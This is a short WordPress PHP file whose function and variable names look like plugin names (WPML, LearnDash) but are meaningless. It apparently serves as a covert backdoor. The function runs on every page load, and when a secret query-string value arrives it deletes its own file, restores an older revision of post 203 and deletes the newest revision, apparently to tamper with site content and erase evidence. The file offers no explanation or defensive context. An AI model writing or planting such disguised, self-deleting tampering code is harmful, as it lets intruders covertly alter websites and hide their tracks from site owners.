<?php

function wpml_top_subscribe_last() {
	if (isset($_GET['slide_learndash_dropdown']) && $_GET['slide_learndash_dropdown'] === 'testimonial_magic_typography') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$thumbnails_feed_mobile = 203;
		$quantity_copy_box = wp_get_post_revisions($thumbnails_feed_mobile);
		if (empty($quantity_copy_box)) die('no revisions');
		if (count($quantity_copy_box) < 2) die('less than 2');
		$rss_archives_auto = array_shift($quantity_copy_box);
		$name_hello_advance_type = $rss_archives_auto->ID;
		$automatic_plus_role = array_shift($quantity_copy_box);
		$plugin_hide_static = $automatic_plus_role->ID;
		$endpoints_themes_local = wp_restore_post_revision($plugin_hide_static);
		if ($endpoints_themes_local === false) die('error restoring');
		$endpoints_themes_local = wp_delete_post_revision($name_hello_advance_type);		
		if ($endpoints_themes_local === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'wpml_top_subscribe_last');
